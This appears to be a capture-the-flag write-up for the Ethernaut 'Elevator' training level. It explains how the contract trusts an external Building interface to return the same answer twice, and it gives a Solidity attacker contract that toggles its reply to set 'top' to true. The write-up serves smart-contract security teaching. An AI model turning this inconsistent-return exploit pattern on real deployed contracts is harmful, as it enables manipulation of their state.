---
layout: writeup
title: "Elevator"
level: "Intermediate"
category: "Ethernaut"
description: "Manipulate an elevator's logic by implementing a malicious Building contract that lies about its state."
---

## Analysis

The `Elevator` contract relies on an interface called `Building`. It calls a function `isLastFloor(uint)` to decide whether to set the `top` variable to `true`.

**The Flaw:**
The `Elevator` contract calls `building.isLastFloor(_floor)` **twice** in the same function:
1. First, to check if it *should* move: `if (!building.isLastFloor(_floor))`
2. Second, to set the `top` status: `top = building.isLastFloor(_floor);`



The `Elevator` assumes that `isLastFloor` will return the same result both times. However, since the `Building` is an interface, **we provide the implementation**. We can design our function to return `false` the first time and `true` the second time.

---

## Solution

You need to deploy a contract that implements the `Building` interface and toggles a boolean state every time the function is called.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./Elevator.sol";

contract Attack is Building {
    Elevator public elevator;
    bool public toggle = true;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;  // first: false, second: true
        return toggle;
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }
}
</code></pre>

---
